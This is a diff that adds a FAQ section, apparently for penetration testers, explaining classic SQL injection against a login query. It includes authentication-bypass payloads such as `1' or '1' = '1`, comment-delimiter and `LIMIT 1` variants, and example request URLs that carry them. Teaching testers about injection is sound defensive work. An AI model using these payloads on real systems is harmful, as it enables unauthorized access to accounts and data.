@@ -127,3 +127,57 @@
   The tester should check by an input fields list whose values could be used in SQL queries separately.
 
 </details>
+
+<details>
+  <summary>What is standard SQL injection testing (Classic SQL injection)?</summary>
+
+  Consider the following SQL query:
+  
+  `SELECT * FROM Users WHERE Username='$username' AND Password='$password'`
+
+  Suppose we insert the following Username and Password values:
+
+  `$username = 1' or '1' = '1`
+
+  `$password = 1' or '1' = '1`
+
+  The query will be:
+
+  `SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`
+
+  If the values was sent by the GET method and if the domain was www.example.com, the request would be:
+
+  `http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`
+
+  After a short analysis, we notice that the query returns a value (or a set of values) because the condition has a successful result (OR 1=1).
+
+  Another example query is the following:
+
+  `SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`
+
+  The query has two problems: the parentheses and the MD5 hash function. The values could be:
+
+  `$username = 1' or '1' = '1'))/*`
+
+  `$password = foo`
+
+  In this way, we’ll get the following query:
+
+  `SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`
+
+  (Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.)
+  The request URL will be:
+
+  `http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`
+
+  It may return many values. Sometimes, the authentication code verifies that the number of returned records/results is equal to 1. Could be use next values:
+
+  `$username = 1' or '1' = '1')) LIMIT 1/*`
+
+  `$password = foo`
+
+  In this way, we create a request like the following:
+
+  `http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`
+
+</details>
